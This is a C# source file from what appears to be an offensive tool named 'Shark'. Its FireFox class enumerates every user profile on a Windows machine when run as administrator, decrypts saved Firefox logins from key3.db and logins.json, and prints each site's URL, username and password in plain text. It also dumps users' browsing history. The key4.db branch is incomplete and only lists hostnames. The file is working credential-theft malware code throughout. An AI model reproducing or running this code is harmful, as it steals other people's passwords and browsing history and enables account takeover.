using System;
using System.Text;
using GetBrowser.Firefox.Cryptography;
using System.Text.RegularExpressions;
using System.IO;
using System.Security.Principal;
using GetBrowser.Firefox.Models;
using System.Collections.Generic;
using System.Collections;
using Shark.lib;
using GetBrowser.Firefox.Helpers;
// 引入SQLite
using System.Data;
using System.Reflection;
using System.Diagnostics;
using CS_SQLite3;

namespace Shark
{
    public class FireFox
    {
       
        public static void GetLogins(string MasterPwd = "")
        {
            ArrayList allPath = GetPath();
            Common.showMessage("[*]", "Try to get FireFox Credential");
            foreach (Dictionary<string, string> firefoxPath in allPath)
            {
                firefoxPath.TryGetValue("firefoxKey3FilePath", out string firefoxKey3FilePath);
                firefoxPath.TryGetValue("firefoxKey4FilePath", out string firefoxKey4FilePath);
                firefoxPath.TryGetValue("firefoxLoginsPath", out string firefoxLoginsPath);
                firefoxPath.TryGetValue("userDir", out string userDir);
                string userName = GetUserName(userDir);
                if (File.Exists(firefoxKey3FilePath) && File.Exists(firefoxLoginsPath))
                {
                    Common.showMessage("[*]", string.Format("Try to get {0} FireFox  Credential", userName));
                    ParseLogins_key3(firefoxKey3FilePath, firefoxLoginsPath, userName, MasterPwd);
                    Common.showMessage("[*]", string.Format("Get {0} FireFox  Credential end", userName));

                }
                if (File.Exists(firefoxKey4FilePath) && File.Exists(firefoxLoginsPath))
                {
                    Common.showMessage("[*]", string.Format("Try to get {0} FireFox  Credential", userName));
                    ParseLogins_key4(firefoxKey3FilePath, firefoxLoginsPath, userName, MasterPwd);
                    Common.showMessage("[*]", string.Format("Get {0} FireFox  Credential end", userName));

                }
            }

        }
        public static void GetHistroy(int num)
        {
            Process[] firefoxProcesses = Process.GetProcessesByName("firefox");
            ArrayList allPath = GetPath();
            Common.showMessage("[*]", string.Format("Try to get FireFox Histroy count:{0}",num.ToString()));
            foreach (Dictionary<string, string> firefoxPath in allPath)
            {
                firefoxPath.TryGetValue("firefoxHistoryPath", out string firefoxHistoryPath);
                firefoxPath.TryGetValue("userDir", out string userDir);
                string userName = GetUserName(userDir);
                if (File.Exists(firefoxHistoryPath))
                {
                    Common.showMessage("[*]", string.Format("Try to get {0} FireFox Histroy count:{1}", userName, num.ToString()));
                    if (firefoxProcesses.Length > 0)
                    {
                        firefoxHistoryPath = CreateTempFile(firefoxHistoryPath);
                        ParseHistory(firefoxHistoryPath, num,userName);
                        File.Delete(firefoxHistoryPath);
                    }
                    else
                    {
                        ParseHistory(firefoxHistoryPath, num,userName);
                    }
                    Common.showMessage("[*]", string.Format("Get {0} FireFox Histroy end", userName));
                }
            }
            Common.showMessage("[*]", string.Format("Try to get FireFox Histroy count:{0} end", num.ToString()));
        }

        /*
         * Firefox Portable 57版本在新的配置文件中包含key3.db文件。
         * Firefox Portable 58 Beta在新的配置文件中具有key4.db文件。
         * 
         */
        private static void ParseLogins_key3(string firefoxKey3FilePath, string firefoxLoginsPath,  string userName, string masterPassword = "")
        {

            Asn1Der asn = new Asn1Der();

            BerkeleyDB db = new BerkeleyDB(firefoxKey3FilePath);
            PasswordCheck pwdCheck = new PasswordCheck(db.GetValueOfKey("password-check").Replace("-", ""));
            string GlobalSalt = db.GetValueOfKey("global-salt").Replace("-", "");
            MozillaPBE CheckPwd = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(GlobalSalt), Encoding.ASCII.GetBytes(masterPassword), ByteHelper.ConvertHexStringToByteArray(pwdCheck.EntrySalt));
            CheckPwd.Compute();
            string decryptedPwdChk = TripleDESHelper.DESCBCDecryptor(CheckPwd.Key, CheckPwd.IV, ByteHelper.ConvertHexStringToByteArray(pwdCheck.Passwordcheck));
            if (!decryptedPwdChk.StartsWith("password-check"))
            {
                Common.showMessage("[-]", "Master password is wrong; cannot decrypt FireFox logins.");
                return;
            }
            // Get private key
            string f81 = String.Empty;
            String[] blacklist = { "global-salt", "Version", "password-check" };
            foreach (var k in db.Keys)
            {
                if (Array.IndexOf(blacklist, k.Key) == -1)
                {
                    f81 = k.Value.Replace("-", "");
                }
            }
            if (f81 == String.Empty)
            {
                Common.showMessage("[-]", "Could not retrieve private key.");
                return;
            }
            Asn1DerObject f800001 = asn.Parse(ByteHelper.ConvertHexStringToByteArray(f81));
            MozillaPBE CheckPrivateKey = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(GlobalSalt), Encoding.ASCII.GetBytes(masterPassword), f800001.objects[0].objects[0].objects[1].objects[0].Data);
            CheckPrivateKey.Compute();
            byte[] decryptF800001 = TripleDESHelper.DESCBCDecryptorByte(CheckPrivateKey.Key, CheckPrivateKey.IV, f800001.objects[0].objects[1].Data);
            Asn1DerObject f800001deriv1 = asn.Parse(decryptF800001);
            Asn1DerObject f800001deriv2 = asn.Parse(f800001deriv1.objects[0].objects[2].Data);
            byte[] privateKey = new byte[24];
            if (f800001deriv2.objects[0].objects[3].Data.Length > 24)
            {
                Array.Copy(f800001deriv2.objects[0].objects[3].Data, f800001deriv2.objects[0].objects[3].Data.Length - 24, privateKey, 0, 24);
            }
            else
            {
                privateKey = f800001deriv2.objects[0].objects[3].Data;
            }
            // decrypt username and password
            Login[] logins = ParseLoginFile(firefoxLoginsPath);
            if (logins.Length == 0)
            {
                Common.showMessage("[-]", "No logins discovered from logins.json");
                return;
            }
            foreach (Login login in logins)
            {
                Asn1DerObject user = asn.Parse(Convert.FromBase64String(login.encryptedUsername));
                Asn1DerObject pwd = asn.Parse(Convert.FromBase64String(login.encryptedPassword));
                string hostname = login.hostname;
                string decryptedUser = TripleDESHelper.DESCBCDecryptor(privateKey, user.objects[0].objects[1].objects[1].Data, user.objects[0].objects[2].Data);
                string decryptedPwd = TripleDESHelper.DESCBCDecryptor(privateKey, pwd.objects[0].objects[1].objects[1].Data, pwd.objects[0].objects[2].Data);
                string firefoxName = Regex.Replace(decryptedUser, @"[^\u0020-\u007F]", "");
                string firefoxPass = Regex.Replace(decryptedPwd, @"[^\u0020-\u007F]", "");
                Common.showMessage("[+]", String.Format("URL:{0} Username:{1} Password:{2}", hostname, firefoxName, firefoxPass));

            }
        }
        
        private static void ParseLogins_key4(string firefoxKey4FilePath, string firefoxLoginsPath, string userName, string masterPassword = "")
        {

            Login[] logins = ParseLoginFile(firefoxLoginsPath);
            foreach (Login login in logins)
            {
                Common.showMessage("[+]", string.Format("found url:{0}, Failed! to decrypt password", login.hostname));

            }
               
        }
        private static string CreateTempFile(string filePath)
        {
            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");
            string newFile = "";
            newFile = Path.GetRandomFileName();
            string tempFileName = localAppData + "\\Temp\\" + newFile;
            File.Copy(filePath, tempFileName);
            return tempFileName;
        }
        private static string GetUserName(string userDir)
        {
            string userName = "";
            if (IsHighIntegrity())
            {
                string[] parts = userDir.Split('\\');
                userName = parts[parts.Length - 1];
            }
            else
            {
                userName = System.Environment.GetEnvironmentVariable("USERNAME");
            }
            return userName;
        }
        private static ArrayList GetPath()
        {
            ArrayList userPaths = new ArrayList();
            ArrayList allPath = new ArrayList();
            if (IsHighIntegrity())
            {
                string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                string[] dirs = Directory.GetDirectories(userFolder);
                foreach (string dir in dirs)
                {
                    userPaths.Add(dir);
                }
            }
            else
            {
                userPaths.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
            }
            foreach (string path in userPaths)
            {
                string userFirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", path);
                if (Directory.Exists(userFirefoxBasePath))
                {
                    string[] directories = Directory.GetDirectories(userFirefoxBasePath);
                    foreach (string directory in directories)
                    {
                        Dictionary<string, string> firefoxPath = new Dictionary<string, string>()
                         {
                             {"firefoxHistoryPath",String.Format("{0}\\{1}", directory,"places.sqlite")},
                             {"firefoxKey3FilePath",String.Format("{0}\\{1}", directory, "key3.db") },
                             {"firefoxKey4FilePath",String.Format("{0}\\{1}", directory, "key4.db") },
                             {"firefoxLoginsPath",String.Format("{0}\\{1}", directory, "logins.json") },
                             {"userDir", path}
                         };
                        allPath.Add(firefoxPath);
                    }
                }
            }
            return allPath;
        }
        
        private static void ParseHistory(string historyFilePath, int num, string userName)
        {
             CO_SQLite3.SqliteDatabase db = new CO_SQLite3.SqliteDatabase();
             db.Open(historyFilePath);
             CO_SQLite3.DataTable dt = db.ExecuteQuery("SELECT title, url FROM moz_places order by  visit_count limit " + num.ToString() + "; ");
             foreach (CO_SQLite3.DataRow dbgRow in dt.Rows)
             {
                 Common.showMessage("[+]", string.Format("Title:{0} url:{1} ", dbgRow["title"], dbgRow["url"]));
             }
             db.Close();
        }

        private static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static Login[] ParseLoginFile(string path)
        {
            string rawText = File.ReadAllText(path);
            int openBracketIndex = rawText.IndexOf('[');
            int closeBracketIndex = rawText.IndexOf(']');
            string loginArrayText = rawText.Substring(openBracketIndex + 1, closeBracketIndex - (openBracketIndex + 1));
            return ParseLoginItems(loginArrayText);
        }


   
        private static Login[] ParseLoginItems(string loginJSON)
        {
            int openBracketIndex = loginJSON.IndexOf('{');
            List<Login> logins = new List<Login>();
            
            string[] intParams = new string[] { "id", "encType", "timesUsed" };
            string[] longParams = new string[] { "timeCreated", "timeLastUsed", "timePasswordChanged" };
            while (openBracketIndex != -1)
            {
                int encTypeIndex = loginJSON.IndexOf("encType", openBracketIndex);
                int closeBracketIndex = loginJSON.IndexOf('}', encTypeIndex);
                Login login = new Login();
                string bracketContent = "";
                for (int i = openBracketIndex + 1; i < closeBracketIndex; i++)
                {
                    bracketContent += loginJSON[i];
                }
                bracketContent = bracketContent.Replace("\"", "");
                string[] keyValuePairs = bracketContent.Split(',');
                foreach (string keyValueStr in keyValuePairs)
                {
                    string[] keyValue = keyValueStr.Split(new Char[] { ':' }, 2);
                    string key = keyValue[0];
                    string val = keyValue[1];
                    if (val == "null")
                    {
                        login.GetType().GetProperty(key).SetValue(login, null, null);
                    }
                    if (Array.IndexOf(intParams, key) > -1)
                    {
                        login.GetType().GetProperty(key).SetValue(login, int.Parse(val), null);
                    }
                    else if (Array.IndexOf(longParams, key) > -1)
                    {
                        login.GetType().GetProperty(key).SetValue(login, long.Parse(val), null);
                    }
                    else
                    {
                        login.GetType().GetProperty(key).SetValue(login, val, null);
                    }
                }
                logins.Add(login);
                openBracketIndex = loginJSON.IndexOf('{', closeBracketIndex);
            }
            return logins.ToArray();
        }
    }
}
